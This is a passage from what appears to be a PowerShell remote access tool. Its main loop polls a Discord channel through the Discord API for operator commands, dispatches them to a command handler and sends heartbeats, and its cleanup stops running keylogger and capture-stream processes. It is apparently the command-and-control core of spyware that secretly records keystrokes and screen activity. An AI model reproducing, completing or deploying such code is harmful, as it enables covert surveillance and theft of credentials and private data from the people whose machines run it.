                if ($firstPass) { $url = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" }
                else { $url = "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=50&after=$cursor" }
                $batch = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
                if (-not $batch) { break }
                if ($batch -isnot [array]) { $batch = @($batch) }
                $batch = @($batch | Sort-Object { [long]$_.id })
                foreach ($m in $batch) { [void]$collected.Add($m); $cursor = $m.id }
                if ($firstPass) { break }
            } while ($batch.Count -eq 50)

            if ($firstPass) {
                if ($collected.Count -gt 0) { $script:lastMessageId = [string]$collected[$collected.Count - 1].id }
            } else {
                foreach ($m in $collected) {
                    if (-not $script:lastMessageId -or [long]$m.id -gt [long]$script:lastMessageId) { $script:lastMessageId = $m.id }
                    if ($m.author.id -eq $script:botUserId) { continue }
                    Handle-Command -Message $m
                }
            }
            if (((Get-Date) - $script:lastBeat).TotalSeconds -ge $script:heartbeatSec) { Send-Heartbeat }
        } catch { Log "[POLL] $($_.Exception.Message)" "Red"; Start-Sleep -Seconds 3 }
        Start-Sleep -Seconds $script:pollInterval
    }
} finally {
    if ($script:capturePid) { try { Stop-CaptureStream | Out-Null } catch { } }
    if ($script:keylogPid) { try { Stop-KeyLog | Out-Null } catch { } }
    Release-Lock
    LogA "Agent ket thuc." "Cyan"
}
